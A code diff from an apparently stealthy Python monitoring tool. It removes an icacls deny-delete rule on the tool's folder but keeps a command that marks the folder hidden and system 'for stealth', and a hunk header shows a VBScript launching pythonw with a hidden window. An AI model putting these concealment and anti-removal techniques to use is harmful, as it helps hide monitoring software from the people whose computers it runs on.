@@ -128,20 +128,16 @@ WshShell.Run "pythonw.exe """ & "{script_path}" & """", 0, False
         return False
 
 def protect_folder():
-    print("\n[INFO] Applying stealth and anti-deletion protection to the monitor folder...")
+    print("\n[INFO] Applying folder hiding for stealth...")
     folder_path = os.path.abspath(os.path.dirname(__file__) or '.')
-    username = os.environ.get("USERNAME")
     
     try:
-        # 1. Prevent folder deletion (Deny Delete permission for current user)
-        if username:
-            subprocess.run(['icacls', folder_path, '/deny', f"{username}:D"], capture_output=True)
-            
-        # 2. Make it a 'Super Hidden' system folder
+        # Keep the folder hidden/system, but do not set deny-delete ACL.
+        # Deny ACL slows down and can block complete remote uninstall.
         subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True)
         
-        print("[OK] Folder is now protected from deletion and hidden from standard view.")
-        print("       (To reverse: run 'attrib -h -s .\\' and 'icacls .\\ /remove:d %username%')")
+        print("[OK] Folder is hidden from standard view.")
+        print("       (To reverse: run 'attrib -h -s .\\')")
     except Exception as e:
         print(f"[WARN] Could not apply folder protection: {e}")
 
